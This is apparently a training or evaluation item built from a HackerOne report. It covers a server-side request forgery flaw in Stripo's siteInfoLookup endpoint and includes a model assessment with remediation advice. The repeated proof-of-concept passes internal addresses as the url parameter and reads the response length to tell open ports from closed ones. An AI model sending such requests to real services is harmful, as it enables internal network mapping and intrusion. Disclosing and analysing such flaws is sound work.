# SSRF — h1

- source: h1
- class: ssrf
- cwe: CWE-918
- severity: medium
- program: stripo
- quality_score: 11

## Scenario

Analyze the following vulnerability report and provide a structured security assessment.

**Report Title:** SSRF in /cabinet/stripeapi/v1/siteInfoLookup?url=XXX
**Affected Asset:** my.stripo.email

**Vulnerability Description:**
## Summary:
SSRF vulnerability allows mapping the internal network.

## Steps To Reproduce:
It is possible to run internal requests with the siteInfoLookup service.

```
GET /cabinet/stripeapi/v1/siteInfoLookup?url=http://[REDACTED_PHONE]:8080 HTTP/1.1
Host: my.stripo.email
```

Based on the response we know if the ip / port is available or not.

The port is not accesible in that IP.
```
Content-Length: 0
```

The port is accesible in that IP.
```
Content-Length: 114 (>0)
```

## Supporting Material/References:
I was able to identify some internal IP address and open ports:
[REDACTED_PRIVATE_IP]:8080
[REDACTED_PRIVATE_IP]:8080
[REDACTED_PRIVATE_IP]:8080
[REDACTED_PRIVATE_IP]:8080 <- NOT ACCESIBLE

## Impact

It is possible to use this vulnerability to map the internal network.

**Steps to Reproduce:**
It is possible to run internal requests with the siteInfoLookup service.

```
GET /cabinet/stripeapi/v1/siteInfoLookup?url=http://[REDACTED_PHONE]:8080 HTTP/1.1
Host: my.stripo.email
```

Based on the response we know if the ip / port is available or not.

The port is not accesible in that IP.
```
Content-Length: 0
```

The port is accesible in that IP.
```
Content-Length: 114 (>0)
```

## Supporting Material/References:
I was able to identify some internal IP address and open ports:
[REDACTED_PRIVATE_IP]:8080
[REDACTED_PRIVATE_IP]:8080
[REDACTED_PRIVATE_IP]:8080
[REDACTED_PRIVATE_IP]:8080 <- NOT ACCESIBLE

**Proof of Concept:**
```
GET /cabinet/stripeapi/v1/siteInfoLookup?url=http://[REDACTED_PHONE]:8080 HTTP/1.1
Host: my.stripo.email
```

```
Content-Length: 0
```

```
Content-Length: 114 (>0)
```

## Analysis / Response

**Vulnerability Class:** ssrf
**CWE:** CWE-918
**Weakness:** Server-Side Request Forgery (SSRF)
**Severity:** medium
**Endpoint Pattern:** GET /cabinet/stripeapi/v1/siteInfoLookup?url=http://10.0.0.100:8080

**Impact Assessment:**
It is possible to use this vulnerability to map the internal network.

**Remediation:**
Validate and sanitize all user-supplied URLs. Implement allowlists for permitted domains and IP ranges. Block requests to internal/private IP ranges.
